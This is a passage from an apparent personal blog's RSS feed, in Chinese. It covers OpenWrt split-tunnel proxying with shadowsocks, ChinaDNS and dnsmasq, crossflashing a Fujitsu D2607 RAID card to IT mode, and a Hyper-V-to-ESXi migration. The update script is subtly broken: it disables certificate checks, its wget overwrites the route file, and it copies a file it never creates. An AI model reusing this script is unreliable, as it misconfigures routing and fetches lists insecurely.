&lt;ul>
&lt;li>依赖iptables-mod-tproxy和ip&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>chinadns和luci-app-chinadns&lt;/li>
&lt;/ul>
&lt;h3 id="配置">配置
&lt;/h3>&lt;ul>
&lt;li>使用luci-app配置shadowsocks
&lt;ul>
&lt;li>开启&lt;code>端口转发&lt;/code>，设置&lt;code>本地端口&lt;/code>为5300，用于DNS查询&lt;/li>
&lt;li>&lt;code>被忽略IP列表&lt;/code>选择ChinaDNS路由表（&lt;code>/etc/chinadns_chnroute.txt&lt;/code>）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用luci-app配置ChinaDNS
&lt;ul>
&lt;li>设置&lt;code>本地端口&lt;/code>为5353&lt;/li>
&lt;li>设置&lt;code>上游服务器&lt;/code>为&lt;code>114.114.114.114,127.0.0.1:5300&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用luci-app配置DHCP/DNS
&lt;ul>
&lt;li>设置&lt;code>DNS转发&lt;/code>为&lt;code>127.0.0.1#5353&lt;/code>&lt;/li>
&lt;li>勾选&lt;code>忽略解析文件&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>这样一来，你拥有了:&lt;/p>
&lt;ul>
&lt;li>一个无污染的DNS服务器，端口为53
&lt;ul>
&lt;li>国内DNS解析出国内IP，国外DNS解析出国外IP&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>一个透明代理的网关
&lt;ul>
&lt;li>如果请求IP在ChinaDNS路由表中，则走正常流量&lt;/li>
&lt;li>如果请求IP不在ChinaDNS路由表中，则走代理流量&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="改进版方案">改进版方案
&lt;/h2>&lt;p>尽管上面的方案已经能够实现透明代理，但是还有以下问题(附上解决方案)：&lt;/p>
&lt;ul>
&lt;li>在某些ISP下使用&lt;code>ss-tunnel&lt;/code>（即端口转发）不稳定, 导致DNS查询时间过长或超时
&lt;ul>
&lt;li>解决方案:
&lt;ul>
&lt;li>使用dnscrypt-proxy提供的DNS查询服务&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>ChinaDNS有时会出现误判，导致访问国内站点时走代理
&lt;ul>
&lt;li>解决方案:
&lt;ul>
&lt;li>在dnsmasq中配置chinalist，指定国内域名使用国内DNS进行解析&lt;/li>
&lt;li>不在列表中的站点交由ChinaDNS判断&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>只能定义强制走代理的IP，而不能是域名，维护起来比较麻烦
&lt;ul>
&lt;li>解决方案:
&lt;ul>
&lt;li>归功于ss-rules的实现，ipset集合&lt;code>ss_spec_dst_fw&lt;/code>中存放强制走代理的IP&lt;/li>
&lt;li>在dnsmasq中配置my-list(自定义域名)列表，将my-list的查询结果保存到&lt;code>ss_spec_dst_fw&lt;/code>中&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="额外安装以下软件">额外安装以下软件:
&lt;/h3>&lt;ul>
&lt;li>安装dnsmasq-full
&lt;ul>
&lt;li>需要先卸载自带的dnsmasq&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>安装dnscrypt-proxy
&lt;ul>
&lt;li>提供安全不受污染的DNS服务器&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="更新配置">更新配置
&lt;/h3>&lt;ul>
&lt;li>使用luci-app配置shadowsocks
&lt;ul>
&lt;li>关闭&lt;code>端口转发&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置dnscrypt-proxy
&lt;ul>
&lt;li>修改监听端口为&lt;code>127.0.0.1:5300&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置dnsmasq
修改&lt;code>/etc/dnsmasq.conf&lt;/code>，在文末加入&lt;code>conf-dir=/etc/dnsmasq.d&lt;/code>:
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;conf-dir=/etc/dnsmasq.d&amp;#39;&lt;/span> &amp;gt;&amp;gt; /etc/dnsmasq.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="定期维护">定期维护
&lt;/h3>&lt;p>以下脚本实现更新china-route、china-dns和my-list的功能:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/bin/sh
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">DNS&lt;/span>&lt;span class="o">=&lt;/span>127.0.0.1#5300
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">IPSET&lt;/span>&lt;span class="o">=&lt;/span>ss_spec_dst_fw
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># update china route&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl &lt;span class="s1">&amp;#39;http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> grep ipv4 &lt;span class="p">|&lt;/span> grep CN &lt;span class="p">|&lt;/span> awk -F&lt;span class="se">\|&lt;/span> &lt;span class="s1">&amp;#39;{ printf(&amp;#34;%s/%d\n&amp;#34;, $4, 32-log($5)/log(2)) }&amp;#39;&lt;/span> &amp;gt; china-route.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># update china dns&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wget --no-check-certificate -O china-route.txt https://raw.githubusercontent.com/felixonmars/dnsmasq-china-list/master/accelerated-domains.china.conf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># update my list&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat my-list.txt &lt;span class="p">|&lt;/span> awk &lt;span class="s1">&amp;#39;{ printf(&amp;#34;server=/&amp;#34;$1&amp;#34;/&amp;#39;&lt;/span>&lt;span class="nv">$DNS&lt;/span>&lt;span class="s1">&amp;#39;\nipset=/&amp;#34;$1&amp;#34;/&amp;#39;&lt;/span>&lt;span class="nv">$IPSET&lt;/span>&lt;span class="s1">&amp;#39;\n&amp;#34;) }&amp;#39;&lt;/span> &lt;span class="c1"># &amp;gt; my-list.conf&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># copy updated files&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp china-list.conf /etc/dnsmasq.d/china-list.conf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp my-list.conf /etc/dnsmasq.d/my-list.conf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp china-route.txt /etc/chinadns_chnroute.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># restart service&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/init.d/dnsmasq restart
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/init.d/chinadns restart
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/init.d/shadowsocks rules
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;updated success&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>其中，my-list.txt中保存需要强制走代理的域名列表&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-txt" data-lang="txt">&lt;span class="line">&lt;span class="cl">ipip.net
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mydomain.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>你需要定期执行这个脚本来对相关列表进行更新。&lt;/p>
&lt;h2 id="总结">总结
&lt;/h2>&lt;blockquote>
&lt;p>使用该方案的前提：&lt;/p>
&lt;ul>
&lt;li>设置PC的网关为openwrt的ip（如:192.168.0.254）&lt;/li>
&lt;li>设置PC的DNS为openwrt的ip（如:192.168.0.254）&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;ul>
&lt;li>当PC端访问国内网站时
&lt;ul>
&lt;li>dnsmasq解析该域名，发现该域名在dnsmasq的china-list中，使用国内DNS进行解析，返回国内IP&lt;/li>
&lt;li>iptables检测到该IP在&lt;code>ss_spec_dst_bp&lt;/code>（即china-route）中，则直连访问&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>访问google.com
&lt;ul>
&lt;li>dnsmasq解析该域名，发现该域名不在dnsmasq的列表中，则交给ChinaDNS查询&lt;/li>
&lt;li>ChinaDNS解析出IP后，发现该IP不匹配china-route列表，则返回国外IP&lt;/li>
&lt;li>iptables检测到该IP不在&lt;code>ss_spec_dst_bp&lt;/code>中，则代理访问&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>访问mydomain.com
&lt;ul>
&lt;li>dnsmasq解析该域名，发现该域名在dnsmasq的my-list中，使用dnscrypt进行解析，返回IP，并将该IP加至&lt;code>ss_spec_dst_fw&lt;/code>中&lt;/li>
&lt;li>iptables检测到该IP在&lt;code>ss_spec_dst_fw&lt;/code>中，则代理访问。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>完:)&lt;/p></description></item><item><title>富士通D2607-A11刷IT模式</title><link>https://www.keepwn.com/posts/crossflashing-the-fujitsu-d2607/</link><pubDate>Fri, 02 Dec 2016 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/crossflashing-the-fujitsu-d2607/</guid><description>&lt;h2 id="准备工具">准备工具
&lt;/h2>&lt;ul>
&lt;li>一张富士通D2607-A11阵列卡&lt;/li>
&lt;li>一个U盘&lt;/li>
&lt;li>一台PC机（支持UEFI启动）&lt;/li>
&lt;/ul>
&lt;h2 id="准备工作">准备工作
&lt;/h2>&lt;ol>
&lt;li>制作DOS启动盘&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>将U盘格式化成FAT32，刷入dos系统&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>下载刷机工具包&lt;a class="link" href="https://www.keepwn.com/downloads/LSI-9211-8i-IT-MODE-TOOLS.zip" >&lt;strong>点击下载&lt;/strong>&lt;/a>&lt;/li>
&lt;li>拷贝刷机所需工具&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>megarec软件&lt;/li>
&lt;li>sas2flash软件&lt;/li>
&lt;li>9211-8i固件&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>拷贝efi shell支持文件&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>在U盘根目录下，创建&lt;code>\efi\boot&lt;/code>目录&lt;/li>
&lt;li>复制shell_v1.efi到&lt;code>\efi\boot&lt;/code>目录，重命名为&lt;code>bootx64.efi&lt;/code>&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;h2 id="开始刷固件">开始刷固件
&lt;/h2>&lt;ol>
&lt;li>插上D2607-A11阵列卡&lt;/li>
&lt;li>启动PC，选择U盘引导，进入DOS命令行&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>备份阵列卡信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;gt;dir
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt;megarec -readsbr 0 sbrbak.bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;ul>
&lt;li>使用&lt;code>xdd&lt;/code>查看sbrbak.bin的数据，在&lt;code>000000d0&lt;/code>行&lt;code>500X XXXX XXXX XXXX&lt;/code>为阵列卡的地址&lt;/li>
&lt;li>强烈建议进行这个操作，尽管我当时忘了&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>刷入sbr&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>刷入fj版sbr
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;gt;megarec -writesbr 0 sbrfj.bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>清空flash
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;gt;megarec -cleanflash 0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>重启PC，选择UEFI版U盘引导，进入efi shell&lt;/li>
&lt;li>刷固件&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>刷入9211 8i固件&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;gt;cd fs0 # 或fs1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt;sas2hax.efi -o -f 2118it.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt;sas2hax.efi -o -b mptsas2.rom
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;ul>
&lt;li>这里使用的shell.efi版本为v1，如果遇到以下报错:&lt;code>InitShellApp: Application not started from Shell&lt;/code>，你可能需要更换shell.efi版本&lt;/li>
&lt;li>这里使用修改后的sas2hax.efi，而不是原版程序sas2flash.efi（D2607-A11无法验证通过）&lt;/li>
&lt;li>在刷入固件的时候，可能会失败，重启系统后尝试重新刷入固件&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>更新SAS Address&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sas2flash -o -sasadd 500* **** **** ****
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;ul>
&lt;li>SAS Address以500开头&lt;/li>
&lt;li>如果不慎丢失SAS Address，以&lt;code>5000 1122 3344&lt;/code>代替&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>重启电脑，进入DOS命令行，重新刷入sbr&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>刷入fj版sbr
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;gt;megarec -writesbr 0 sbrfj.bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>必须重刷一次sbr，否则只能用阵列卡的一个端口了&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>重启电脑就能在启动信息中看到新的设备信息&lt;/li>
&lt;/ol>
&lt;h2 id="额外的">额外的
&lt;/h2>&lt;ul>
&lt;li>一开始装在GEN8上来刷LSI固件，尝试了多种方式都刷不成功，所以在刷之前最好准备一台支持UEFI的主机。&lt;/li>
&lt;li>看了错误的教程，导致SAS Address丢失，只能随便填了串地址。就目前来看，似乎不会影响到阵列卡的使用&lt;/li>
&lt;li>二手的D2607-A11，成色不咋地，有个接口有点变形，现在觉得有点后悔。配的挡板太高，想装在GEN8上只能把它拆了。&lt;/li>
&lt;li>原接在GEN8主板SAS接口上的线缆连接到D2607-A11的接口上，这样就可以实现sata5的SSD+直通4硬盘的方案了。&lt;/li>
&lt;/ul>
&lt;h2 id="参考">参考
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="https://marcan.st/2016/05/crossflashing-the-fujitsu-d2607/" target="_blank" rel="noopener"
>https://marcan.st/2016/05/crossflashing-the-fujitsu-d2607/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.broadcom.com/products/storage/host-bus-adapters/sas-9211-8i#downloads" target="_blank" rel="noopener"
>https://www.broadcom.com/products/storage/host-bus-adapters/sas-9211-8i#downloads&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.chiphell.com/thread-1629960-1-1.html" target="_blank" rel="noopener"
>https://www.chiphell.com/thread-1629960-1-1.html&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://koolshare.cn/thread-64959-1-1.html" target="_blank" rel="noopener"
>http://koolshare.cn/thread-64959-1-1.html&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/tianocore/edk2" target="_blank" rel="noopener"
>https://github.com/tianocore/edk2&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>从Hyper-V迁移到ESXI的血泪史</title><link>https://www.keepwn.com/posts/moving-hyperv-to-esxi/</link><pubDate>Fri, 03 Jun 2016 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/moving-hyperv-to-esxi/</guid><description>&lt;h2 id="背景">背景
&lt;/h2>&lt;p>怎么说呢，在买Gen8之前就已经仔细比较过Hyper-V和ESXI的优劣，最终选择了Hyper-V的方案。&lt;/p>
&lt;p>当时决定选择Hyper-V平台有以下几个理由：&lt;/p>
&lt;ul>
&lt;li>Hyper-V提供的存储池使用方便，用起来简单&lt;/li>
&lt;li>Hyper-V相对于ESXI而言比较轻量，没有ESXI那么多臃肿的功能&lt;/li>
&lt;li>Hyper-V下可以实现硬盘休眠&lt;/li>
&lt;li>其实最主要的原因是，觉得自己的需求不大，哪个简单用哪个&lt;/li>
&lt;/ul>
&lt;p>现在想来真是too young啊，我的需求怎么可能不大呢，Hyper-V自身的限制成了严重的短板。总之，在权衡未来需求和迁移成本之后，决定使用ESXI平台了。&lt;/p>
&lt;p>于是，我从一条不归路&lt;strong>Server2012 With Hyper-V&lt;/strong>走向了另一条不归路&lt;strong>ESXI6.0&lt;/strong>。&lt;/p>
&lt;!-- more -->
&lt;h2 id="第一坑安装esxi之不识别ssd">第一坑：安装ESXI之不识别SSD
&lt;/h2>&lt;p>之前使用Hyper-V平台时，没有采用Gen8提供的硬件RAID功能，使用的Server2012提供的存储池功能，所以切换到ESXI平台时，重新对本地硬盘进行了硬件RAID设置。&lt;/p>
&lt;p>安装ESXI到SD卡的过程略过，按正常操作来，没什么问题。在对ESXI进行配置的时候遇到了问题，系统只能识别到设置了RAID的硬盘，无法识别到SSD。&lt;/p>
&lt;p>网上查了些资料，&lt;strong>RAID模式下识别不到普通硬盘&lt;/strong>，要想识别到SSD，必须对SSD设置RAID，只有一块SSD怎么办？&lt;strong>设置为RAID0&lt;/strong>。&lt;/p>
&lt;h2 id="第二坑安装虚拟机之freenas">第二坑：安装虚拟机之freenas
&lt;/h2>&lt;p>在我的规划中，所有的资料（非虚拟机文件）由freenas进行统一管理，freenas开放smb、nfs服务给其他虚拟机，一方面解决了资料分散，不易管理的问题，另一方面只要保证freenas的可用性，就算其他虚拟机崩溃甚至损坏，都不会对资料有任何影响。&lt;/p>
&lt;p>创建freenas的时候，直接分配全部的磁盘空间（&amp;gt;2T）给freenas的一块虚拟磁盘，然而启动freenas时，一直卡在启动界面，显示磁盘分配错误。&lt;/p>
&lt;p>虽然猜测是分配磁盘过大导致了这个问题，然而在网上并没有查阅到明确的说法。&lt;/p>
&lt;p>在本地做了几个测试后发现，一旦分配磁盘大于2T，freenas就会卡死在启动界面。（真的只是个例？具体原因有待进一步分析）&lt;/p>
&lt;p>当然，临时解决办法也很简单，&lt;strong>把磁盘分拆为多个1T大小的虚拟磁盘&lt;/strong>，挂载给freenas。&lt;/p>
&lt;h2 id="第三坑安装虚拟机之openwrt">第三坑：安装虚拟机之openwrt
&lt;/h2>&lt;p>正常方式安装openwrt，启动openwrt时，会大概率的出现卡死现象。（在《Openwrt上使用dnsmasq和ipset实现域名分流》中已经详细说明具体的原因，这里不再重复）&lt;/p>
&lt;h2 id="第四坑安装虚拟机之dsm">第四坑：安装虚拟机之dsm
&lt;/h2>&lt;p>首先，DSM的版本是XPEnology DSM5.2。&lt;/p>
&lt;p>在Hyper-V上安装dsm非常简单，然而在ESXI上安装完成以后无法进入系统。&lt;/p>
&lt;p>在正常的安装流程中，虚拟机都是由XPEnologyBoot.iso进行引导启动。简单判断以后，觉得可能由于虚拟机重启以后，未能从cd启动导致的。&lt;/p>
&lt;p>进入虚拟机bios修改第一启动项为cd，保存，重新启动，WTF，怎么还是引导不了。&lt;/p>
&lt;p>重新进入bios查看启动项信息，发现上次的修改并没有被保存。（在win10的vmware workstation中进行了相同操作，对vmware的修改是生效的。）&lt;/p>
&lt;p>看来只能放大招了么，&lt;strong>手动修改vmx！&lt;/strong>&lt;/p>
&lt;p>修改虚拟机的&lt;code>.vmx&lt;/code>文件，强制第一启动项为&lt;code>cdrom&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">bios.bootOrder = &amp;#34;cdrom,hdd,floppy&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>搞定。&lt;/p>
&lt;h2 id="后记">后记
&lt;/h2>&lt;p>虽然说从Hyper-V切换到ESXI的过程中，遇到了很多不可描述性的问题，但好在都解决了。问我现在用着ESXI的感觉么？感觉还不错:)&lt;/p></description></item><item><title>Openwrt上使用dnsmasq和ipset实现域名分流</title><link>https://www.keepwn.com/posts/route-traffic-selectively-by-domain-on-openwrt/</link><pubDate>Wed, 01 Jun 2016 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/route-traffic-selectively-by-domain-on-openwrt/</guid><description>&lt;h2 id="目标">目标
&lt;/h2>&lt;p>部署一台自动代理路由器，实现根据域名来自动设定直连或者代理，而我要做的只是设置PC的默认网关为主路由器（192.168.0.1）还是自动代理路由器（192.168.0.254）。&lt;/p>
&lt;h2 id="创建openwrt虚拟机">创建Openwrt虚拟机
&lt;/h2>&lt;p>系统版本&lt;/p>
&lt;ul>
&lt;li>主路由器 (ip: &lt;code>192.168.0.1&lt;/code>)&lt;/li>
&lt;li>ESXI 6.0U2&lt;/li>
&lt;li>Openwrt 15.05.1 (ip: &lt;code>192.168.0.254&lt;/code>，gateway: &lt;code>192.168.0.1&lt;/code>)&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;p>Openwrt虚拟机的配置教程有很多，这里只针对ESXI版Openwrt可能会遇到的问题说明下：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在ESXI6上，&lt;code>openwrt_x86&lt;/code>每次启动时会大概率的出现卡死现象，表现为&lt;code>Kernel panic - not syncing: Attempted to kill init&lt;/code>。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>解决办法&lt;/strong>：改用&lt;code>openwrt_x64&lt;/code>后正常。原因未知。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>在ESXI6上，在&lt;code>openwrt&lt;/code>上执行某些命令时，会被强制关机，表现为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">来自 promote 的消息: The operation on the file &amp;#34;/vmfs/devices/deltadisks/17ad1ab5-openwrt-15. 05.1-x86-64-combined-ext4-s001.vmdk&amp;#34; failed (Bad address). The file system where disk &amp;#34;/vmfs /devices/deltadisks/17ad1ab5-openwrt-15.05.1-- x86-64-combined-ext4-s001.vmdk&amp;#34; resides is full. Select _Retry to attempt the operation again. Select Cancel to end the session.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;strong>解决办法&lt;/strong>：在&lt;code>Vmware Fusion&lt;/code>中新建openwrt虚拟机（&lt;em>other/other linux 64, 256MB，虚拟机版本为11&lt;/em>），第一次启动后，关机导出为&lt;code>ova&lt;/code>，然后再导入到ESXI6中。具体原因未知。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="安装软件">安装软件
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
